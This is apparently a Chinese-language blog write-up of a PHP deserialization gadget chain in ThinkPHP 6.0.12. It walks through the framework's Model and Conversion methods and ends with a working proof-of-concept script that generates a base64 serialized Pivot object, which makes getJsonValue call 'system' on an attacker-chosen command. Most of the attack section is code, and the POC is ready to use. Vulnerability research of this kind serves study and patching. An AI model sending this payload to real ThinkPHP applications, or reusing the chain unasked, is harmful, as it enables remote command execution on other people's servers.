## 环境

Thinkphp6.0.12LTS(目前最新版本)；

PHP7.3.4。

## 安装

    
    
    composer create-project topthink/think tp6
    

## 测试代码

![image](https://image.3001.net/images/20220209/1644401624_620393d81c2811edea97b.png!small)

## 漏洞分析

漏洞起点不是`__desturct`就是`__wakeup`全局搜索下，起点在`vendor\topthink\think-orm\src\Model.php`

只要把`this->lazySave`设为`True`,就会调用了`save`方法。

![image](https://image.3001.net/images/20220209/1644401649_620393f1f17529986b9ae.png!small)

跟进`save`方法，漏洞方法是`updateData`，但需要绕过①且让②为`True`,①调用`isEmpty`方法。

![image](https://image.3001.net/images/20220209/1644401701_620394254d96ab452524d.png!small)

    
    
    public function save(array $data = [], string $sequence = null): bool
        {
            // 数据对象赋值
            $this->setAttrs($data);
            if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
                return false;
            }
            $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
    

跟进`isEmpty`方法,只要`$this->data`不为空就行。

![image](https://image.3001.net/images/20220209/1644401721_62039439c2ee8058ba88f.png!small)

`$this->trigger`方法默认返回就不是`false`，跟进`updateData`方法。漏洞方法是`checkAllowFields`默认就会触发。

![image](https://image.3001.net/images/20220209/1644401732_620394447cdf706c39624.png!small)

    
    
    protected function updateData(): bool
        {
            // 事件回调
            if (false === $this->trigger('BeforeUpdate')) {
                return false;
            }
            $this->checkData();
    
            // 获取有更新的数据
            $data = $this->getChangedData();
    
            if (empty($data)) {
                // 关联更新
                if (!empty($this->relationWrite)) {
                    $this->autoRelationUpdate();
                }
                return true;
            }
            if ($this->autoWriteTimestamp && $this->updateTime) {
                // 自动写入更新时间
                $data[$this->updateTime]       = $this->autoWriteTimestamp();
                $this->data[$this->updateTime] = $data[$this->updateTime];
            }
            // 检查允许字段
            $allowFields = $this->checkAllowFields();
    

跟进`checkAllowFields`方法，漏洞方法是`db`，默认也是会触发该方法，继续跟进。

![image](https://image.3001.net/images/20220209/1644401745_620394510cae5c8630601.png!small)

    
    
    protected function checkAllowFields(): array
        {
            // 检测字段
            if (empty($this->field)) {
                if (!empty($this->schema)) {
                    $this->field = array_keys(array_merge($this->schema, $this->jsonType));
                } else {
                    $query = $this->db();
    

跟进`db`方法，存在`$this->table .
$this->suffix`字符串拼接，可以触发`__toString`魔术方法，把`$this->table`设为触发`__toString`类即可。

![image](https://image.3001.net/images/20220209/1644401755_6203945b0faef71720429.png!small)

    
    
    public function db($scope = []): Query
        {
            /** @var Query $query */
            $query = self::$db->connect($this->connection)
                ->name($this->name . $this->suffix)
                ->pk($this->pk);
            if (!empty($this->table)) {
                $query->table($this->table . $this->suffix);
            }
    

全局搜索`__toString`方法，最后选择`vendor\topthink\think-orm\src\model\concern\Conversion.php`类中的`__toString`方法。

跟进`__toString`方法，调用了`toJson`方法。

![image](https://image.3001.net/images/20220209/1644401767_6203946715efd193413a3.png!small)

跟进`toJson`方法，调用了`toArray`方法，然后以JSON格式返回。

![image](https://image.3001.net/images/20220209/1644401782_6203947624be5092ab1de.png!small)

跟进`toArray`方法,漏洞方法是`getAtrr`默认就会触发，只需把`$data`设为数组就行。

![image](https://image.3001.net/images/20220209/1644401793_62039481494977ee2c76f.png!small)

    
    
    public function toArray(): array
        {
            $item       = [];
            $hasVisible = false;
    
            foreach ($this->visible as $key => $val) {
                if (is_string($val)) {
                    if (strpos($val, '.')) {
                        [$relation, $name]          = explode('.', $val);
                        $this->visible[$relation][] = $name;
                    } else {
                        $this->visible[$val] = true;
                        $hasVisible          = true;
                    }
                    unset($this->visible[$key]);
                }
            }
            foreach ($this->hidden as $key => $val) {
                if (is_string($val)) {
                    if (strpos($val, '.')) {
                        [$relation, $name]         = explode('.', $val);
                        $this->hidden[$relation][] = $name;
                    } else {
                        $this->hidden[$val] = true;
                    }
                    unset($this->hidden[$key]);
                }
            }
    
            // 合并关联数据
            $data = array_merge($this->data, $this->relation);
    
            foreach ($data as $key => $val) {
                if ($val instanceof Model || $val instanceof ModelCollection) {
                    // 关联模型对象
                    if (isset($this->visible[$key]) && is_array($this->visible[$key])) {
                        $val->visible($this->visible[$key]);
                    } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {
                        $val->hidden($this->hidden[$key]);
                    }
                    // 关联模型对象
                    if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {
                        $item[$key] = $val->toArray();
                    }
                } elseif (isset($this->visible[$key])) {
                    $item[$key] = $this->getAttr($key);
                } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                    $item[$key] = $this->getAttr($key);
    

跟进`getAttr`方法，漏洞方法是`getValue`，但传入`getValue`方法中的`$value`是由`getData`方法得到的。

![image](https://image.3001.net/images/20220209/1644401806_6203948e600be34dfc7af.png!small)

    
    
    public function getAttr(string $name)
        {
            try {
                $relation = false;
                $value    = $this->getData($name);
            } catch (InvalidArgumentException $e) {
                $relation = $this->isRelationAttr($name);
                $value    = null;
            }
    
            return $this->getValue($name, $value, $relation);
    

跟进`getData`方法，`$this->data`可控，`$fieldName`来自`getRealFieldName`方法。

![image](https://image.3001.net/images/20220209/1644401816_6203949871a29b8feb20f.png!small)

跟进`getRealFieldName`方法，默认直接返回传入的参数。所以`$fieldName`也可控，也就是传入`getValue`的`$value`参数可控。

![image](https://image.3001.net/images/20220209/1644401834_620394aad4a7b64703bc3.png!small)

跟进`getValue`方法，在Thinkphp6.0.8触发的漏洞点在①处，但在Thinkphp6.0.12时已经对传入的`$closure`进行判断。此次漏洞方法的`getJsonValue`方法。但需要经过两个if判断，`$this->withAttr`和`$this->json`都可控，可顺利进入`getJsonValue`方法。

![image](https://image.3001.net/images/20220209/1644401845_620394b54f80a87c9dd40.png!small)

    
    
    protected function getValue(string $name, $value, $relation = false)
        {
            // 检测属性获取器
            $fieldName = $this->getRealFieldName($name);
    
            if (array_key_exists($fieldName, $this->get)) {
                return $this->get[$fieldName];
            }
    
            $method = 'get' . Str::studly($name) . 'Attr';
            if (isset($this->withAttr[$fieldName])) {
                if ($relation) {
                    $value = $this->getRelationValue($relation);
                }
                if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
                    $value = $this->getJsonValue($fieldName, $value);
    

跟进`getJsonValue`方法，触发漏洞的点在`$closure($value[$key],
$value)`只要令`$this->jsonAssoc`为`True`就行。

`$closure`和`$value`都可控。

![image](https://image.3001.net/images/20220209/1644401857_620394c1c2998bf5ddbc2.png!small)

    
    
    protected function getJsonValue($name, $value)
        {
            if (is_null($value)) {
                return $value;
            }
    
            foreach ($this->withAttr[$name] as $key => $closure) {
                if ($this->jsonAssoc) {
                    $value[$key] = $closure($value[$key], $value);
    

## 完整POP链条

![image](https://image.3001.net/images/20220209/1644401868_620394cc32a26ab72ffb0.png!small)

## POC编写

    
    
    <?php
    namespace think{
        abstract class Model{
            private $lazySave = false;
            private $data = [];
            private $exists = false;
            protected $table;
            private $withAttr = [];
            protected $json = [];
            protected $jsonAssoc = false;
            function __construct($obj = ''){
                $this->lazySave = True;
                $this->data = ['whoami' => ['dir']];
                $this->exists = True;
                $this->table = $obj;
                $this->withAttr = ['whoami' => ['system']];
                $this->json = ['whoami',['whoami']];
                $this->jsonAssoc = True;
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model{
        }
    }
    
    namespace{
        echo(base64_encode(serialize(new think\model\Pivot(new think\model\Pivot()))));
    }
    

## 利用

![image](https://image.3001.net/images/20220209/1644401889_620394e1e6167d455768d.png!small)

![image](https://image.3001.net/images/20220209/1644401901_620394edc081df80ee94f.png!small)

